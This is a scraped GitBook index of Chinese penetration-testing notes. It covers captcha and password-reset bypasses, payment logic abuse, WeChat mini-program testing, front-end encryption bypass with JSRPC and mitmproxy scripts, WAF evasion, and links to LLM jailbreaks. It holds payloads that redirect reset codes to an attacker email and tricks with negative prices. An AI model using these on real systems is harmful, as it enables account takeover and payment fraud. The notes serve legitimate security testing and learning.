图形验证码有效时间过长（碰到过一个验证码信息存储在JWT的里的，通过修改EXP从而验证码复用） 没有重置图形验证码 后端实际不校验验证码 图形验证码Dos攻击 通过控制图形验证码的大小 滑块验证码 https://www.freebuf.com/articles/web/238038.html 看我如何绕过滑块验证码拿到高危漏洞 - 先知社区 (aliyun.com) Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-25 22:02:34 "},"01.渗透测试/02.Web安全/11.逻辑漏洞/02.任意用户密码重置.html":{"url":"01.渗透测试/02.Web安全/11.逻辑漏洞/02.任意用户密码重置.html","title":"02.任意用户密码重置","keywords":"","body":"一般重置密码流程 输入与账户关联的邮箱地址或用户名 通过以下方式验证身份： 邮箱验证：接收包含重置链接的邮件。 短信验证：获取包含验证码的短信。 安全问题：回答预设的安全问题。 重置密码 点击邮件或短信中的链接，或输入验证码后，进入密码重置页面。 输入新密码并确认。 完成重置 系统提示密码重置成功，使用新密码登录 常见场景 可能出现在新用户注册页面，也可能是用户登录后重置密码的页面，或者用户忘记密码时的密码找回页面。其中，密码找回功能是重灾区。 在第二步验证身份时 重置凭证泄漏 响应包中返回短信验证码 邮件重置链接泄露 重置凭证接收方可劫持 a、构造两个参数： email=victim@xyz.tld&email=hacker@xyz.tld b、使用抄送方式: email=victim@xyz.tld%0a%0dcc:hacker@xyz.tld c、使用分隔符： email=victim@xyz.tld,hacker@xyz.tld email=victim@xyz.tld%20hacker@xyz.tld email=victim@xyz.tld|hacker@xyz.tld 可修改请求包中的手机号控制短信验证码发送到哪 phone=phone2；phone=phone1，phone2 可修改请求包中的邮箱 PHP修改user[email]=admin@gmail.com为user[email][]=admin@gmail.com&user[email][]=evil@gmail.com a、构造两个参数： email=victim@xyz.tld&email=hacker@xyz.tld b、使用抄送方式: email=victim@xyz.tld%0a%0dcc:hacker@xyz.tld c、使用分隔符： email=victim@xyz.tld,hacker@xyz.tld email=victim@xyz.tld%20hacker@xyz.tld email=victim@xyz.tld|hacker@xyz.tld 验证码可暴力破解 服务端实际未校验 重置链接中的token格式符合即可，内容随便填 短信验证码置空，置null，万能验证码 可枚举无密保的用户名，导致任意密保答案均可重置密码 依靠前端 js 判断是否可以进入第三步 第二步校验通过时服务端并未向客户端 set-cookie，而是通过前端 js 判断，只需将响应内容替换成通过校验的即可 在第三步重置密码时 绑定关系失效 重置密码时通过sessionid绑定账号，利用？ 重置密码通过请求包中的用户名参数进行绑定 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-25 22:18:07 "},"01.渗透测试/02.Web安全/11.逻辑漏洞/03.支付漏洞.html":{"url":"01.渗透测试/02.Web安全/11.逻辑漏洞/03.支付漏洞.html","title":"03.支付漏洞","keywords":"","body":" 支付流程 选择商品和数量-选择支付及配送方式-生成订单编号-订单支付选择（是否支付）-完成支付 商品价格 整型溢出 超出最大值后重新开始计数 负数 正常的逻辑是用户购买商品，然后价格累加得到一个总价进行扣款。这个时候就会产生逻辑问题：如果说用户购买的商品价格是负数了，那么计算的总数就是负数。反过来钱给用户 四舍五入 以充值为例，余额值一般保存到分为止，那么如果我充值 0.001元也就是1厘，一般开发会在前端判断我们的数字，或者将最后一位四舍 五入，使用支付宝充值是直接报错的，因为第三方一般只支持到分。 那我们如果充值0.019呢，由于支付宝只判断到分，所以导致只能支付0.01， 而由于我们支付成功，前端会将9四舍五入，直接变成0.02，所以等于直接半价 充值。（这个漏洞京东也是有的，不过后来修复了。 营销折扣 积分兑换场景 积分抵钱是如何换算的？ # 假设1比2换算，1积分算2元 100 - 积分 = 100 - 积分 100 - -积分 = 100 + 积分 100 - 积分*10 = (100 - 积分) *10 100 - (2*积分) = 100 - (2*积分) 100 - (2* (积分-积分-1) ) = 100 + 2 优惠券场景 并发领取 盗用 研究优惠卷的编号规律，使用没领的 水平越权，盗用别人的 重复使用 使用优惠卷的数据包进行并发，创建多个使用了优惠券的订单 订单关闭返还优惠券：使用优惠卷创建一个待支付订单，然后关闭这个待支付订单，这时候订单关闭会返还优惠卷，如果这个关闭的订单可以重新变为待支付订单（就是之前使用优惠券的金额）那么就存在这个漏洞 每日签到场景 修改当前设备时间 并发签到 修改数据包时间参数 签约低价场景 场景：就是用户第一个月会员便宜，但是会在签约对象那里开通自动续费功能 多次签约低价 漏洞危害：原本只能低价开通一个月，但是通过这个漏洞能够低价开通不止一个月 漏洞原理：签约的对象有多个，比如微信和支付宝，让这两个都停留在签约界面，然后先完成其中一个签约再取消签约，再到另一个完成签约，因为第一个签约被取消掉了所以服务端认为另一个签约还是第一次签约，从而低价开通了两个月 订单判断 并发支付 购买成功之后，继续重放请求，可以让购买的商品一直增加。购买成功之后，会有一个银行对商户网站跳转的过程，如果反复进行操作，有几率会导致商品反复购买和增加，但是不需要付更多的钱。 替换支付 同时向服务器发起二次支付请求一个多一个少，支付金额少的，然后支付之后进行替换，告知服务器订单支付完成，并且过程可以反复的回放。 订单商品修改 把商品放入购物车点击下单支付，会跳转到微信，支付宝等第三方支付平台。这个时候还可以继续在购物车中加入商品，支付结束之后，商家发放的商品是现在的购物车里面的东西。 支付接口 支付接口修改 支付接口密钥Key 暴力破解 秘钥泄漏 8.欺诈:需要两个收款人，一个是正常的商家，一个是伪造的商家 9.单位替换：产生在paypal类似的国际支付的场景。 支付安全修复 1、在后端检查订单的每一个值，包括支付状态； 2、校验价格、数量参数，比如产品数量只能为整数，并限制最大购买数量 ； 3、与第三方支付平台检查，实际支付的金额是否与订单金额一致； 4、如给用户退款，要使用原路、原订单退回。如：退押金，按用户原支付订单原路退回； 5、加密、解密、数字签名及验证，这个可以有效避免数据修改，重放攻击中的各种问题； 6、金额超过指定值，进行人工审核等。 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-25 22:18:58 "},"01.渗透测试/02.Web安全/11.逻辑漏洞/04.其他.html":{"url":"01.渗透测试/02.Web安全/11.逻辑漏洞/04.其他.html","title":"04.其他","keywords":"","body":"并发--条件竞争 万物皆可并发 修复方案 数据库的事务锁 时间校验漏洞 通过更改系统时间来进行绕过 植物大战僵尸浇水 提前进入活动页面可输入字符，比如某奶茶免单输入口令 ​ Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-25 22:19:49 "},"01.渗透测试/02.Web安全/12.微信小程序/小程序与公众号.html":{"url":"01.渗透测试/02.Web安全/12.微信小程序/小程序与公众号.html","title":"小程序与公众号","keywords":"","body":"微信小程序和公众号 这两有的会校验数据包中的User-Agent，所以用一些扫描工具的时候要带上对应的User-Agent才行 或者要带上UA和cookie # 公众号UA Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 NetType/WIFI MicroMessenger/7.0.20.1781(0x6700143B) WindowsWechat(0x63090621) XWEB/8287 Flue # 小程序UA Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF XWEB/8287 小程序接口→Web后台 开发者为了方便管理和调试，会在公网 Api 后端服务器上搭建一个后台管理界面从而方便管理数据 把小程序抓包时的url复制到浏览器中，寻找后台（蛮多的🤗） 后台名称 常规的 小程序名字缩写+web等 比如 就这个后台出了三个高危，弱口令，任意文件上传，存储型xss 小程序本身 微信小程序安全浅析 抓包 PC：proxifier+burp Android：同一个局域网下，wifi代理+burp 解包还原 一键解密+反编译工具 https://pan.baidu.com/s/1N3ZR3djSaS8g_RXc0Hsa5Q?login_type=qzone&pwd=f79y&_at_=1693833286263 注意点：进入小程序后，先把各种功能点点，加载更多的程序之后再进行反编译 小程序打开时 打开点点点之后，点了一部分后就多了3MB PC 需要先解密，再反编译，小程序文件位置如下 Android 直接反编译即可 /data/data/com.tencent.mm/MicroMsg/df69765be7b6e4a441a86a25d26e861f/appbrand/pkg/_-1486048203_3.wxapkg 敏感信息泄露 # 会在KillWxapkg.exe同目录下生成sensitive_data.json文件 KillWxapkg.exe -id=wxid -in=\".wxapkg所在目录\" -sensitive 配置文件在KillWxapkg.exe同目录下的config目录 小程序hook开启F12 KillWxapkg.exe -hook # WeChatOpenDevTools python main.py -all 小程序文件在nodomain下 accesstoken泄露-小程序接管 泄漏了AppID和AppSecret，可以通过接口获取accesstoken来接管小程序 还有一种是消耗每天的accesstoken的获取次数 sessionkey泄漏 解密 利用 利用这个漏洞的危害也很简单，就是我们可以在这个微信小程序的站点找到里面管理员的手机号，然后去替换手机号，然后再反向加密，然后再替换回开始登录的数据包中，然后再一键放包，就可以成功登录我们管理员的后台了 微信开发者工具调试 报错修复 wxml文件（样式文件）报错修复：直接删除 插件修复：遇到不需要使用的插件直接删除，要用到的插件去官方后台添加 公众号 跟web思路一样，注意UA头即可 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-28 15:48:40 "},"01.渗透测试/02.Web安全/13.前端加密对抗/前端加密渗透.html":{"url":"01.渗透测试/02.Web安全/13.前端加密对抗/前端加密渗透.html","title":"前端加密渗透","keywords":"","body":" Yakit：热加载 burp：插件burpcrypto，autodecoder 前置相关知识 js发起http请求 在JavaScript中，发起HTTP请求主要有以下几种方式，适用于不同的环境和需求： 1. XMLHttpRequest XMLHttpRequest 是一个在较早版本的JavaScript中用于发起HTTP（或HTTPS）请求的对象。它广泛用于AJAX编程中以异步方式从服务器获取数据，不刷新页面。 ‌示例代码‌： var xhr = new XMLHttpRequest(); xhr.open(\"GET\", \"https://api.example.com/data\", true); xhr.onreadystatechange = function () { if (xhr.readyState === 4 && xhr.status === 200) { console.log(xhr.responseText); } }; xhr.send(); 2. Fetch API Fetch API 是一个现代的接口，用于在网络上进行HTTP请求。它提供了一个更简单和灵活的方式来发起请求和处理响应，比XMLHttpRequest更直观。 ‌示例代码‌： fetch('https://api.example.com/data') .then(response => response.json()) .then(data => console.log(data)) .catch(error => console.error('Error:', error)); 3. jQuery.ajax() 如果你在项目中使用了jQuery库，可以使用$.ajax()方法轻松发起HTTP请求。这个方法提供了一个灵活的接口，能够处理多种数据类型，并且支持回调函数管理请求的成功和失败。 ‌示例代码‌： $.ajax({ url: \"https://api.example.com/data\", method: \"GET\", success: function(data) { console.log(data); }, error: function(xhr, status, error) { console.error(\"Error: \" + error); } }); 4. Axios Axios 是一个基于Promise的HTTP客户端，适用于浏览器和node.js。它提供了一种更现代的方式来发起HTTP请求，比原生的XMLHttpRequest和Fetch API都要易用。 ‌安装‌（在Node.js环境下或通过npm/yarn在前端项目中）： npm install axios ‌示例代码‌： javascriptCopy Codeimport axios from 'axios'; axios.get('https://api.example.com/data') .then(response => { console.log(response.data); }) .catch(error => { console.error('Error:', error); }); 密码学 对称加密 对称加密是一种加密方法，其中发送方和接收方使用相同的密钥来加密和解密数据，因此对称加密的安全性取决于对称密钥的保密性。 这种加密方式因其效率高、速度快而被广泛应用于需要大量数据加密的场景中，常见的对称加密算法如下： AES DES与3DES SM4 DES算法不够安全（可被暴力破解），现代大都采用AES算法进行加密，SM4为国密算法。 非对称加密--公钥算法 非对称加密使用一对密钥：一个公钥和一个私钥。公钥可以自由分发，用于加密信息；私钥则必须保密，用于解密信息。 RSA SM2 ESC DSA DH密钥交换 非对称加密算法虽然提供了更高的安全性，但由于其计算复杂度较高，处理速度通常慢于对称加密算法。 因此，在实际应用中，经常将非对称加密与对称加密结合起来使用，比如在建立安全连接时使用非对称加密交换对称密钥，然后使用对称加密进行后续的数据传输，以达到安全与效率的平衡。 加密模式 加密模式 CBC ECB IV（初始块） 需要 不需要 KEY 的长度 16/24/32 字节 16/24/32 字节 加密后特征 IV不同，密文也不相同 明文是静态的 - 两个明文相同，那么他们密文也相同 前端加密库 前端加密一般常用的是两个库，CryptoJS 和 jsrsasign，他们彼此侧重点其实是不一样的： CryptoJS CryptoJS 主要提供 AES，SHA，HMAC，PBKDF2 等加密算法 AES：默认配置CBC模式，PKCS#7填充 // 引入 CryptoJS 库 const CryptoJS = require('crypto-js'); // 示例明文 const word = \"Hello, World!\"; // 密钥和初始化向量 const key = CryptoJS.enc.Utf8.parse('1234567890123456'); // 16字节密钥 const iv = CryptoJS.enc.Utf8.parse('1234567890123456'); // 16字节IV // 加密 const encrypted = CryptoJS.AES.encrypt(word, key, { iv: iv }).toString(); console.log(\"Encrypted Data:\", encrypted); // 解密 const decrypted = CryptoJS.AES.decrypt(encrypted, key, { iv: iv }).toString(CryptoJS.enc.Utf8); console.log(\"Decrypted Data:\", decrypted); jsencrypt jsencrypt 是一个用 JavaScript 编写的库，用于在浏览器端实现 RSA 加密和解密。加解密时默认填充模式：PKCS#1 v1.5 生成密钥对 var encrypt = new JSEncrypt(); encrypt.getKey(); // 生成密钥对 var pub_key = encrypt.getPublicKey(); // 获取公钥 var pri_key = encrypt.getPrivateKey(); // 获取私钥 console.log(\"Public Key:\", pub_key); console.log(\"Private Key:\", pri_key); 加密 var encrypt = new JSEncrypt(); encrypt.setPublicKey(pubkey); var text = \"Hello, World!\"; var encrypted = encrypt.encrypt(text); console.log(encrypted); // 加密后的文本 解密 var decrypt = new JSEncrypt(); decrypt.setPrivateKey(pri_key); var decrypted = decrypt.decrypt(encrypted); console.log(\"Decrypted Text:\", decrypted); // 解密后的文本 toString编码 CryptoJS 的 key 在没有明确指定编码方式的情况下，默认的 toString 方法将输出十六进制 (Hex) 格式的字符串。 var key = CryptoJS.enc.Utf8.parse('1234567890123456'); key.toString(); // 输出 \"31323334353637383930313233343536\" //其他编码 key.toString(CryptoJS.enc.Base64); // 输出 \"MTIzNDU2Nzg5MDEyMzQ1Ng==\" key.toString(CryptoJS.enc.Utf8); // 输出 \"1234567890123456\" 加密函数的toString()通常都是使用base64方法对得到的字节密文进行编码 ​ 基础案例 yakit自带靶场 https://github.com/SwagXz/encrypt-labs 防篡改 //密钥获取 function generateKey() { return CryptoJS.enc.Utf8.parse(\"1234123412341234\") // 十六位十六进制数作为密钥 } const key = generateKey() // 加密方法 function Encrypt(word) { console.info(word); return CryptoJS.HmacSHA256(word, key.toString(CryptoJS.enc.Utf8)).toString(); } function outputObj(jsonData) { const word = `username=${jsonData.username}&password=${jsonData.password}`;; return { \"signature\": Encrypt(word), \"key\": key.toString(), username: jsonData.username, password: jsonData.password, } } 原理 前端：把数据按照一定格式使用哈希算法进行秘钥哈希运算生成哈希值，发送数据包携带这个哈希值和key 后端：此时后端拿到数据有（以上边靶场为例）：signature、key、username、password。把username和password按照一定格式在进行秘钥哈希运算生成的值与signature对比，若一样验证通过！ 解决 热加载代码 sign = func(password) { key = `1234123412341234` data=f`username=admin&password=${password}` signature = codec.EncodeToHex(codec.HmacSha256(key, data)) return signature } 使用热加载 先 HMAC-SHA256 再 RSA //公钥获取 setTimeout(function(){ fetch('/crypto/js/rsa/public/key').then(async function(rsp) { pubkey = await rsp.text() document.getElementById('submit').disabled = false; document.getElementById('submit').innerText = '提交表单数据'; console.info(pubkey) }) },300) function generateKey() { return CryptoJS.enc.Utf8.parse(\"1234123412341234\") // 十六位十六进制数作为密钥 } const key = generateKey() // 加密方法 function Encrypt(word) { console.info(word); return KEYUTIL.getKey(pubkey).encrypt(CryptoJS.HmacSHA256(word, key.toString(CryptoJS.enc.Utf8)).toString()); } function outputObj(jsonData) { const word = `username=${jsonData.username}&password=${jsonData.password}`;; return { \"signature\": Encrypt(word), \"key\": key.toString(), username: jsonData.username, password: jsonData.password, } } sign = func(password) { key = `1234123412341234` data=f`username=admin&password=${password}` pem = `-----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvbwzeHs99hoATSTO6ZQg HHYr9U0ZV3l5KDhgwcFAe2nhBfyX4Po2OT8bb0te68y2pyl3/zrYxn5WJY2WXgNa cZycgYCBkESkXUWrAV6zsUQFmIX8CMqv6lCElZDiO5aNEB4c4cM0P+tECtPHgbQK t1QQD1iD9Dlw800eIPE8tPoeHLcdyQJYrLZgHgAPN4J6vwhtThyyqjUJWFNp/V2J bgo3GsxKZaU2emrFWXqcGVQP78mVUih4YlWHGFPyEnOLqg0noAb0vttsUILJvLrn v2pOcnxj1zgK8CghMrehJ9XycGaKI9JIisD4noE70videPMYIZxzyA7YB+k4nEMs 8QIDAQAB -----END PUBLIC KEY-----` //KEYUTIL.getKey(pubkey).encrypt(CryptoJS.HmacSHA256(word, key.toString(CryptoJS.enc.Utf8)).toString()); signature = codec.EncodeToHex(codec.HmacSha256(key, data)) signature = codec.EncodeToHex(codec.RSAEncryptWithPKCS1v15(pem,signature)~) return signature } 请求加密 AES CBC模式（KEY/IV前端生成） //生成IV var iv = CryptoJS.lib.WordArray.random(128/8); //生成key function generateKey() { return CryptoJS.enc.Utf8.parse(\"1234123412341234\") // 十六位十六进制数作为密钥 } // 加密方法 function Encrypt(word) { console.info(word); return CryptoJS.AES.encrypt(word, key, {iv: iv}).toString(); } function outputObj(jsonData) { const word = JSON.stringify(jsonData); return { \"data\": Encrypt(word), \"key\": key.toString(), iv: iv.toString(), } } yakit热加载代码 m = {\"username\":\"admin\",\"password\":password} //转化为json字符串 data = json.dumps(m) key = codec.DecodeHex(\"31323334313233343132333431323334\")~ iv = codec.DecodeHex(\"1383d3da1795e731f78388eefc50dd03\")~ signature = codec.AESCBCEncryptWithPKCS7Padding(key, data, iv)~ signature = codec.EncodeBase64(signature) return signature AES CBC模式（Key/IV通过RSA加密传输） 全加密流程 服务端：pub1，pri1，key1，iv1 客户端：pub2，pri2，key2，iv2 请求包： 客户端随机生成aes加密所需的key2与iv2，客户端用pub1加密key2与iv2，key2加密数据data，传输的数据为{enc_data，enc_key,enc_iv} 服务端先使用pri1来解密得到key2与iv2，再使用其解密数据data 返回包： 服务端随机生成aes加密所需的key1与iv1，服务端使用pub2加密key1与iv1，key1加密数据data，传输的数据为{enc_data，enc_key,enc_iv} 客户端先使用pri2来解密得到key1与iv1，再使用其解密数据data 防重放 js混淆 js混淆了解 webpack JSRPC使用 console注入jsrpc function Hlclient(wsURL) { this.wsURL = wsURL; this.handlers = { _execjs: function (resolve, param) { var res = eval(param) if (!res) { resolve(\"没有返回值\") } else { resolve(res) } } }; this.socket = undefined; if (!wsURL) { throw new Error('wsURL can not be empty!!') } this.connect() } Hlclient.prototype.connect = function () { console.log('begin of connect to wsURL: ' + this.wsURL); var _this = this; try { this.socket = new WebSocket(this.wsURL); this.socket.onmessage = function (e) { _this.handlerRequest(e.data) } } catch (e) { console.log(\"connection failed,reconnect after 10s\"); setTimeout(function () { _this.connect() }, 10000) } this.socket.onclose = function () { console.log('rpc已关闭'); setTimeout(function () { _this.connect() }, 10000) } this.socket.addEventListener('open', (event) => { console.log(\"rpc连接成功\"); }); this.socket.addEventListener('error', (event) => { console.error('rpc连接出错,请检查是否打开服务端:', event.error); }); }; Hlclient.prototype.send = function (msg) { this.socket.send(msg) } Hlclient.prototype.regAction = function (func_name, func) { if (typeof func_name !== 'string') { throw new Error(\"an func_name must be string\"); } if (typeof func !== 'function') { throw new Error(\"must be function\"); } console.log(\"register func_name: \" + func_name); this.handlers[func_name] = func; return true } //收到消息后这里处理， Hlclient.prototype.handlerRequest = function (requestJson) { var _this = this; try { var result = JSON.parse(requestJson) } catch (error) { console.log(\"catch error\", requestJson); result = transjson(requestJson) } //console.log(result) if (!result['action']) { this.sendResult('', 'need request param {action}'); return } var action = result[\"action\"] var theHandler = this.handlers[action]; if (!theHandler) { this.sendResult(action, 'action not found'); return } try { if (!result[\"param\"]) { theHandler(function (response) { _this.sendResult(action, response); }) return } var param = result[\"param\"] try { param = JSON.parse(param) } catch (e) {} theHandler(function (response) { _this.sendResult(action, response); }, param) } catch (e) { console.log(\"error: \" + e); _this.sendResult(action, e); } } Hlclient.prototype.sendResult = function (action, e) { if (typeof e === 'object' && e !== null) { try { e = JSON.stringify(e) } catch (v) { console.log(v)//不是json无需操作 } } this.send(action + atob(\"aGxeX14\") + e); } function transjson(formdata) { var regex = /\"action\":(?.*?),/g var actionName = regex.exec(formdata).groups.actionName stringfystring = formdata.match(/{..data..:.*..\\w+..:\\s...*?..}/g).pop() stringfystring = stringfystring.replace(/\\\\\"/g, '\"') paramstring = JSON.parse(stringfystring) tens = `{\"action\":` + actionName + `,\"param\":{}}` tjson = JSON.parse(tens) tjson.param = paramstring return tjson } 注册监听 var demo = new Hlclient(\"ws://127.0.0.1:12080/ws?group=zzz\"); 通过v_jstools或者关键字寻找断点 v_jstools配置 hook-console hook-function hook-eval 勾选 `是否在调试输出时，输出函数出发的地址` 勾选 `是否启用下面几个加解密函数挂钩输出功能` hook-JSON.parse hook-JSON.stringify hook-escape hook-atob hook-btoa v_jstools：HOOK json 定位 关键字 encrypt decrypt aes 加密库 请求头键值 .... console注册请求包所需要的变量和函数 运行到断点时，注册全局变量 注意：这里直接在同一个浏览器中复制页面进行 //时间戳 window.time = Date.parse //requestId window.id = p //v函数 window.v1 = v //签名 window.m = a.a.MD5 //假设加密函数let data = r.encVal(m)，调用加密即为enc.encVal(param) window.enc = r 注册远程调用函数 // enc为jsrpc函数名即action=enc demo.regAction(\"enc\", function (resolve,param) { // 请求需要的各种值 let timestamp = time(new Date()); let requestid = id(); let v_data = JSON.stringify(v1(param)); let sign = m(v_data + requestid + timestamp).toString(); // 调用注册的全局函数获得值 let encstr = enc(v_data); // 返回数据 let res = { \"timestamp\":timestamp, \"requestid\":requestid, \"encstr\":encstr, \"sign\":sign }; resolve(res); }) demo.regAction(\"dec\", function (resolve,param) { // 请求需要的各种值 let timestamp = time(new Date()); let requestid = id(); let v_data = JSON.stringify(v1(param)); let sign = m(v_data + requestid + timestamp).toString(); // 调用注册的全局函数获得值 let encstr = dec(v_data); // 返回数据 let res = { \"timestamp\":timestamp, \"requestid\":requestid, \"encstr\":encstr, \"sign\":sign }; resolve(res); }) 调试jsrpc POST /go group=zzz&action=req&data= 编写请求替换代码 1.联动Yakit热加载 请求加密 // 定义加密函数 func get_enc(data){ //JSrpc的group group = \"zzz\"; //jsrpc的action action = \"enc\"; rsp,rep,err = poc.Post(\"http://127.0.0.1:12080/go\",poc.replaceBody(\"group=\"+group+\"&action=\"+action+\"&param=\"+data, false),poc.appendHeader(\"content-type\", \"application/x-www-form-urlencoded\")) if(err){ return(err) } return json.loads(rsp.GetBody())[\"data\"] } // beforeRequest 允许发送数据包前再做一次处理，定义为 func(origin []byte) []byte beforeRequest = func(req) { //获取请求体 req_body = poc.GetHTTPPacketBody(req) // 通过jsprc调用获取需要的参数 res = get_enc(string(req_body)) res = json.loads(res) //修改请求头 req = poc.ReplaceHTTPPacketHeader(req, \"requestId\", res[\"requestid\"]) req = poc.ReplaceHTTPPacketHeader(req, \"timestamp\", res[\"timestamp\"]) req = poc.ReplaceHTTPPacketHeader(req, \"sign\", res[\"sign\"]) //请求体替换为加密数据 req = poc.ReplaceHTTPPacketBody(req, res[\"encstr\"]) // 返回加密后的数据 return []byte(req) } 解密请求 // 定义解密密函数 func get_dec(data){ //JSrpc的group group = \"zzz\"; //jsrpc的action action = \"dec\"; rsp,rep,err = poc.Post(\"http://127.0.0.1:12080/go\",poc.replaceBody(\"group=\"+group+\"&action=\"+action+\"&param=\"+data, false),poc.appendHeader(\"content-type\", \"application/x-www-form-urlencoded\")) if(err){ return(err) } return json.loads(rsp.GetBody())[\"data\"] } // afterRequest 允许对每一个请求的响应做处理，定义为 func(origin []byte) []byte afterRequest = func(rsp) { // 获取响应体 rsp_body = poc.GetHTTPPacketBody(rsp) // 通过jsprc调用获取明文 res = get_dec(string(rsp_body)) // 替换响应体 rsp = poc.ReplaceBody(rsp, res, false ) // 返回解码后的数据 return []byte(rsp) } 2.mitm中转 mitm.py import json import time import hashlib import uuid from mitmproxy import http import requests import requests # 限制域名 domain = \"http://39.98.108.20:8085/api/\" def request(flow: http.HTTPFlow) -> None: if flow.request.pretty_url.startswith(domain): # 提取原始请求体 original_body = flow.request.content.decode('utf-8') data = {\"group\": \"zzz\", \"action\": \"req\", \"param\": original_body} res = requests.post(\"http://127.0.0.1:12080/注册全局变量\",data=data) res_json = json.loads(res.text)[\"data\"] data_json = json.loads(res_json) print(data_json) # 对请求体进行加密处理（这里假设加密方法是简单的哈希） encrypted_body = data_json[\"encstr\"] # 替换请求体 flow.request.text = encrypted_body # 生成 requestId，sign 和 timestamp request_id = data_json[\"requestid\"] timestamp = data_json[\"timestamp\"] sign = data_json[\"sign\"] # 添加或替换请求头 flow.request.headers[\"requestId\"] = request_id flow.request.headers[\"timestamp\"] = str(timestamp) flow.request.headers[\"sign\"] = sign 启动 mitmproxy -p 8083 -s mitm.py 设置burp上游代理 实现如下效果 mitmproxy按回车健查看具体flow 案例 Cap4j框架 某银行开发框架 防篡改X-VALID-Token 防重放X-AntiReply-Token（密文每次不同） 身份认证AUTH加密（密文每次不同） 定时请求/api/refershtoken接口 情况1 如果传输的数据不为JSON格式，只需要将POST请求改为文件上传请求格式即可绕过 情况2 如果传输的数据为JSON格式，通过jsrpc+yakit进行绕过 注意：会定时请求/api/refershtoken接口会刷新access-token，导致生成的X-AntiReply-Token，AUTH会改变，所以需要重新注册全局变量 其他参考案例 https://xz.aliyun.com/t/15969?time__1311=GqjxcD2DnD0Du7Dl2%2BY0%3Dt53wDg7QDmOAbD https://xz.aliyun.com/t/16497?time__1311=GuD%3Dqmx%2Bxfxx%2FD0lWGkDuCagYY5Kw%2B4pD Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-06 21:30:56 "},"01.渗透测试/02.Web安全/AI大模型.html":{"url":"01.渗透测试/02.Web安全/AI大模型.html","title":"AI大模型","keywords":"","body":"AI大模型 过期的LLM 越狱代码 越狱 Llama-3.1-8B-Instruct – 杰力皓博 AI 的视觉注入攻击 大模型（ChatGPT）“语料污染”第一真实案例 https://app.follow.is/feeds/collections/83210461062246400?view=0 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-18 15:19:42 "},"01.渗透测试/02.Web安全/Waf绕过学习.html":{"url":"01.渗透测试/02.Web安全/Waf绕过学习.html","title":"WAF绕过学习","keywords":"","body":"知己知彼 WAF功能介绍（入门扫盲篇） - 一觉醒来写程序 - 博客园 WAF的工作流程 预处理 网络层过滤：IP黑白名单 由于HTTP是应用层的协议，每次WAF都要解析它，会造成很大性能损耗。而对于某些经常发恶意请求的IP或进行CC攻击的IP，如果能够在网络层就把它们拦截了，对WAF性能是有很大的提升。 应用层过滤：在接收到数据请求流量时会先判断是否为HTTP/HTTPS请求，之后会查看此URL请求是否在白名单之内，如果该URL请求在白名单列表里，直接交给后端Web服务器进行响应处理，对于不在白名单之内的对数据包解析后进入到规则检测部分。 规则检测 解析后的数据包会进入到检测体系中进行规则匹配，检查该数据请求是否符合规则，识别出恶意攻击行为。 处理模块 针对不同的检测结果，处理模块会做出不同的安全防御动作，如果符合规则则交给后端Web服务器进行响应处理，对于不符合规则的请求会执行相关的阻断、记录、告警处理。 日志记录 WAF在处理的过程中也会将拦截处理的日志记录下来，方便用户在后续中可以进行日志查看分析。 WAF分类 本文以安全狗为例子进行简单学习 WAF部署位置 请求 → CDN → 云waf → 硬waf → WEB服务器 → 软waf → WEB应用程序（代码waf） → (数据库) 储备知识 waf了解 编码和编程语言函数 http协议 web服务器特性 互联网标准文档RFC 常见绕过手法 迂回作战类 主打一个侧面绕过，利用各种缺陷和特性使得waf没有解析到payload，而后端可以正常解析，不与waf的规则和策略硬刚。 Web服务器特性 Web服务器解析与waf解析不同绕过 IIS+ASP % 对于URL请求的参数值中的%，如果和后面的字符构成的字符串在URL编码表之外，ASP脚本处理时会将其忽略。 select → se%lect unicode IIS会自动解码unicode HPP--参数污染 传递多个相同参数，利用waf和web服务器解析的参数不同来进行绕过 Web 环境 参数获取函数 获取到的参数 PHP/Apache $_GET(\"par\") last JSP/Tomcat Request.getParameter(\"par\") first Perl(CGI)/Apache Param(\"par\") first Python/Apache getvalue(\"par\") [\"first\",\"last\"] ASP.NET/IIS Request.QueryString(\"par\") first,last 畸形请求头 Web服务器可以解析畸形请求头，但是Waf不能解析畸形请求头 都不能解析畸形请求头，利用Web服务器的解析流程 比如shiro的一个绕过方式，使用畸形请求头来绕过waf。因为shiro是先处理cookie，然后请求到servlet被解析，所以rememberMe值是会处理的。 后端语言特性 后端代码解析与waf解析不同 waf没有根据后端代码来修改策略和规则 编码 对请求数据进行编码，例如url编码，Unicode编码，Base64编码等，如果waf对数据不能有效的解码，而应用后端能够正常解码，就可以绕过waf。 比如 Json数据支持Unicode编码 Base64编码 ​ JSP支持多重Unicode编码 java支持的编码 //res {\"Big5\",\"Big5-HKSCS\",\"CESU-8\",\"EUC-JP\",\"EUC-KR\",\"GB18030\",\"GB2312\",\"GBK\",\"IBM-Thai\",\"IBM00858\",\"IBM01140\",\"IBM01141\",\"IBM01142\",\"IBM01143\",\"IBM01144\",\"IBM01145\",\"IBM01146\",\"IBM01147\",\"IBM01148\",\"IBM01149\",\"IBM037\",\"IBM1026\",\"IBM1047\",\"IBM273\",\"IBM277\",\"IBM278\",\"IBM280\",\"IBM284\",\"IBM285\",\"IBM290\",\"IBM297\",\"IBM420\",\"IBM424\",\"IBM437\",\"IBM500\",\"IBM775\",\"IBM850\",\"IBM852\",\"IBM855\",\"IBM857\",\"IBM860\",\"IBM861\",\"IBM862\",\"IBM863\",\"IBM864\",\"IBM865\",\"IBM866\",\"IBM868\",\"IBM869\",\"IBM870\",\"IBM871\",\"IBM918\",\"ISO-2022-CN\",\"ISO-2022-JP\",\"ISO-2022-JP-2\",\"ISO-2022-KR\",\"ISO-8859-1\",\"ISO-8859-13\",\"ISO-8859-15\",\"ISO